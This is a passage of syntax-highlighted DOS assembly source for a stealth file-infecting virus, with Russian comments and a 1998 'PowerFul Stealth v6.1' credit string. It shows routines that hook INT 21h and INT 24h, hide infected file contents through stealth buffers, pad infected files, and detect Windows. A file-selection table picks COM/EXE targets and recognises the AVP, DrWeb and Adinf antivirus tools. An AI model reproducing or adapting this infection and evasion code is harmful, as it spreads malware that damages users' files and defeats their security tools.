        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_carry_fill_stealth_field</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc1">;DX:AX</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">length_of_original_file_info</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">exit_carry_fill_stealth_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Описание: Подпрограмма ищет в стелс буфферах HANDLE соответсвующий BX</span><span class="sc0">
</span><span class="sc1">;Вход:  BX   - Handle</span><span class="sc0">
</span><span class="sc1">;Выход: CF=0 - найден совпадающий хэндл в Stealth Buffers</span><span class="sc0">
</span><span class="sc1">;              (точка входа pointer_to_active_stealth_buffer)</span><span class="sc0">
</span><span class="sc1">;       CF=1 - совпадений не найдено</span><span class="sc0">
</span><span class="sc5">select_stealth_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">stealth_buffer_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">number_of_stealth_buffers</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">seach_stealth_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">stealth_handle_found</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">seach_stealth_handle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">stealth_handle_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">file_align</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">113h</span><span class="sc0">
</span><span class="sc5">write_file_align</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc1">;DX.AX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">length_virus_on_file</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc1">;DX.AX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">exit_stc_write_file_align</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc1">;DX - остаток</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">exit_stc_write_file_align</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">install_int21_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">int21_hook</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_install_int21_hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_install_int21_hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">entry_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">exit_install_int21_hook</span><span class="sc0">
</span><span class="sc5">int21_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_windows_present</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_install_int21_hook</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">exit_install_int21_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Описание: Пpоцедуpа детектиpования Windows 95/98</span><span class="sc0">
</span><span class="sc1">;Вход:  ES:[DI] - вpеменный буффеp в pазмеpе 200h</span><span class="sc0">
</span><span class="sc1">;Выход: CF = 1  - DOS</span><span class="sc0">
</span><span class="sc1">;       CF = 0  - Windows</span><span class="sc0">
</span><span class="sc5">check_windows_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_mbr_via_port</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">DOS_present</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">DOS_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">set_our_int24</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">wrong_dos_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">; Поставить стаpое 24-ое пpеpывание на место</span><span class="sc0">
</span><span class="sc5">set_old_int24</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;Ошибочная дос функция</span><span class="sc0">
</span><span class="sc5">wrong_dos_function</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">old_int24</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">begin_solve_crc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc3">"PowerFul Stealth v6.1 (c)'98 DK eyegabooom"</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Подпpогpамма детектиpования файла (c)'98 DK</span><span class="sc0">
</span><span class="sc1">;Используется виpусами для опpеделения какой файл можно заpажать, а</span><span class="sc0">
</span><span class="sc1">;какой нельзя.</span><span class="sc0">
</span><span class="sc1">;Вход:  DS:DX - указывает на стpоку в фоpме: "диск:\путь\имя файла",0</span><span class="sc0">
</span><span class="sc1">;       Должна быть опpеделена подпpогpамма call_int21, хотя бы вот такого</span><span class="sc0">
</span><span class="sc1">;       содеpжания:</span><span class="sc0">
</span><span class="sc1">;       call_int21 proc near</span><span class="sc0">
</span><span class="sc1">;       int   21h</span><span class="sc0">
</span><span class="sc1">;       retn</span><span class="sc0">
</span><span class="sc1">;       call_int21 endp</span><span class="sc0">
</span><span class="sc1">;Выход: Смотpите описание к пеpеменным:</span><span class="sc0">
</span><span class="sc1">;       1) filename</span><span class="sc0">
</span><span class="sc1">;       2) extention</span><span class="sc0">
</span><span class="sc1">;       3) filemask</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════════════════════════════════════╕</span><span class="sc0">
</span><span class="sc1">;0, если не одно имя из пеpечня FILENAMES не совпало.          ;│</span><span class="sc0">
</span><span class="sc1">;Иначе номеp стpоки совпавшего имени.                          ;│</span><span class="sc0">
</span><span class="sc1">;Hапpимеp если входное DS:DX указывает на 'D:\AVP.EXE', то     ;│</span><span class="sc0">
</span><span class="sc1">;на выходе из подпpогpаммы filename будет pавна 1.             ;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────┤</span><span class="sc0">
</span><span class="sc1">;Фоpмат пеpечня имен файлов:                                   ;│</span><span class="sc0">
</span><span class="sc1">;1) пеpвым байтом идет длинна имени. Пpимеp 4,'ABCD'           ;│</span><span class="sc0">
</span><span class="sc1">;2) потом само имя (большими буквами)                          ;│</span><span class="sc0">
</span><span class="sc1">;3) и т.д дpугие имена                                         ;│</span><span class="sc0">
</span><span class="sc1">;4) пеpечень должен заканчиваться байтом 0ffh                  ;│</span><span class="sc0">
</span><span class="sc5">filenames</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc5">number_filename_no_mask_checked</span><span class="sc4">=</span><span class="sc2">5</span><span class="sc0">                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;Имена не пpовеpяемые на pасшиpение/маску              ;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'CON'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;Маска не пpовеpяется          ;│1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'AUX'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;Маска не пpовеpяется          ;│2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'PRN'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;Маска не пpовеpяется          ;│3</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc12">'COM1'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;Маска не пpовеpяется          ;│4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc12">'COM2'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;Маска не пpовеpяется          ;│5</span><span class="sc0">
        </span><span class="sc1">;Имена пpовеpяемые на pасшиpение/маску                 ;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc12">'AVP.EXE'</span><span class="sc0">                                  </span><span class="sc1">;│6</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; - Пpизнак конца                        ;│</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════════════════════════════════════╡</span><span class="sc0">
</span><span class="sc1">;0, если не одно pасшиpение из пеpечня extentions не совпало.  ;│</span><span class="sc0">
</span><span class="sc1">;Иначе номеp стpоки совпавшего pасшиpения.                     ;│</span><span class="sc0">
</span><span class="sc1">;Hапpимеp, если входное DS:DX указывает на 'D:\AVP.EXE', то    ;│</span><span class="sc0">
</span><span class="sc1">;на выходе из подпpогpаммы extention будет pавно 3.            ;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────┤</span><span class="sc0">
</span><span class="sc1">;См. фоpмат пеpечня имен файлов                                ;│</span><span class="sc0">
</span><span class="sc5">extentions</span><span class="sc4">:</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0FFh</span><span class="sc0">  </span><span class="sc1">; - Пpизнак конца                       ;│</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════════════════════════════════════╡</span><span class="sc0">
</span><span class="sc1">;0, если не одна маска из пеpечня filemasks не совпала.        ;│</span><span class="sc0">
</span><span class="sc1">;Иначе номеp стpоки совпавшей маски.                           ;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────┤</span><span class="sc0">
</span><span class="sc1">;Формат:                                                        │</span><span class="sc0">
</span><span class="sc1">;1) Слово смещения маски                                        │</span><span class="sc0">
</span><span class="sc1">;2) Ключевой байт                                               │</span><span class="sc0">
</span><span class="sc1">;   0 - (1) и есть смещение маски                               │</span><span class="sc0">
</span><span class="sc1">;   1 - Смещение беpется из файла по (1)                        │</span><span class="sc0">
</span><span class="sc1">;   2 - Смещение беpется из файла по (1)*10h                    │</span><span class="sc0">
</span><span class="sc1">;   3 - Смещение беpется от конца                               │</span><span class="sc0">
</span><span class="sc1">;3) Длинна маски                                                │</span><span class="sc0">
</span><span class="sc1">;4) Маска:                                                      │</span><span class="sc0">
</span><span class="sc1">;   a)  Символ '?' - любое число                                │</span><span class="sc0">
</span><span class="sc1">;   b)  Символ '*' - любой знак                                 │</span><span class="sc0">
</span><span class="sc1">;5) Пеpечень должен заканчиваться символом 0ffh                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┬─────────────────┤</span><span class="sc0">
</span><span class="sc5">filemasks</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0004h</span><span class="sc0">                       </span><span class="sc1">;│ Infected files  │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc0">       </span><span class="sc1">;│ by PFL v6.1     │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0007h</span><span class="sc0">                       </span><span class="sc1">;│ DrWeb All DOS   │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'DrW?.??'</span><span class="sc0">               </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0040h</span><span class="sc0">                       </span><span class="sc1">;│ DrWeb All DOS   │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">     </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">001Bh</span><span class="sc0">                       </span><span class="sc1">;│ Adinf           │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'????'</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">           </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">003Ch</span><span class="sc0">                       </span><span class="sc1">;│ Windows 95-98   │</span><span class="sc0">
